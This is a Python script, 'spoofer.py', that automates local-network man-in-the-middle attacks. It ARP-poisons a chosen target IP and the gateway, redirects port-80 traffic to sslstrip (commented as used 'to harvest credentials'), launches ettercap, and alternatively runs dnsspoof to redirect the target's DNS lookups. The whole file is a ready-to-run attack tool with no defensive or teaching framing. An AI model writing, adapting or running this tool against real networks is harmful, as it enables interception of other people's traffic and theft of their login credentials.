#!/usr/bin/python
#
# Usage: ./spoofer.py {adapter} {slave-ip} {gateway-ip}
# eg: ./spoofer.py waln0 10.0.0.10 10.0.0.1
#
# Requirements:
# Dnsiff (arpspoof) - sslstrip - ettercap
#

from os import system, getuid
from sys import argv, exit
from time import sleep

class colours:
    bold = '\033[1m'
    red = '\033[31m'
    green = '\033[32m'
    reset = '\033[0;0m'

def arp_cleanup():
    # stop arpspoof    
    print "\n[+] Stopping arpspoof"
    system('killall arpspoof')            
    sleep(1)
    # set ip_forward to 0    
    print "[+] Stopping IPv4 forwarding"
    system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    sleep(1)
    # clear iptables rules
    print "[+] Flushing iptable rules"
    system("iptables -t nat -D PREROUTING -i %s -p tcp --dport 80 -j REDIRECT --to-port 10000" % adapter)
    sleep(1)
    # stop ssl strip
    print "[+] Stopping sslstrip\n"
    system('kill $(ps -ef | grep sslstrip | awk \'{print $2}\')')
    sleep(1)
    exit()

def dns_cleanup():
    raw_input('\n[+] Hit ENTER to exit')
    # stop arpspoof    
    print "\n[+] Stopping dnsspoof"
    system('killall dnsspoof')            
    sleep(2)
    print "[+] Stopping arpspoof"
    system('killall arpspoof')            
    sleep(3)
    # stop dnsspoof    
    # set ip_forward to 0    
    print "[+] Stopping IPv4 forwarding\n"
    system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    sleep(1)
    exit()

if getuid() != 0:
    print("You need to be root (sudo %s)" % argv[0])
else:
    if len(argv) < 2:
        system('clear')
        print("\nusage: %s adapter" % argv[0])
        print("\teg: %s eth0\n" % argv[0])
    else:
        # set some variables
        adapter = argv[1]

        spooftype = 0
        while spooftype != range(1,3):
            system('clear')
            spooftype = raw_input("\nSelect spoof type:\n\n[1] arp poison\n[2] dns spoof\n\nspoofer > ")
            # arp spoof attack
            if spooftype == "1":    
                slave = raw_input("\nEnter slave IP: > ")
                gateway = raw_input("Enter gateway IP: > ")

                # set rules for traffic forwarding            
                print "\n[+] Setting iptable rules"
                system("iptables -t nat -A PREROUTING -i %s -p tcp --dport 80 -j REDIRECT --to-port 10000" % adapter)
                sleep(2)

                # start arp poison on slave / gateway    
                print "[+] Starting arpspoof"
                system('arpspoof -i %s -t  %s  %s > /dev/null 2>&1 &' % (adapter, slave, gateway))
                sleep(2)

                # start sslstrip to harvest credentials
                print "[+] Starting sslstrip"
                system('python /pentest/web/sslstrip/sslstrip.py -a -f -k > /dev/null 2>&1 &')
                sleep(2)

                # run ettercap against slave
                print "[+] Starting ettercap"
                system('xterm -e ettercap -T -q -i %s &' % adapter)
                sleep(2)

                # set ip forward mode
                system('echo 1 > /proc/sys/net/ipv4/ip_forward')
                sleep(1)

                print colours.bold + colours.red + "\n[+] Before exiting quit ettercap gracefully. (hit Q in the ettercap window)" + colours.reset
                raw_input('\n[+] Hit ENTER to exit')

                # clean up            
                arp_cleanup()

            if spooftype == "2":
                slave = raw_input("\nEnter slave IP: > ")
                gateway = raw_input("Enter gateway IP: > ")

                # arp poison slave / gateway
                print colours.bold + colours.green + "\n[+] Poisoning..." + colours.reset
                system('arpspoof -i %s -t  %s  %s > /dev/null 2>&1 &' % (adapter, slave, gateway))
                sleep(2)

                # set ip forward mode
                system('echo 1 > /proc/sys/net/ipv4/ip_forward')
                sleep(1)

                # start dnsspoof
                system('dnsspoof -i %s -f /root/hosts.txt host %s and udp port 53 > /dev/null 2>&1 &' % (adapter, slave))

                #clear up
                dns_cleanup()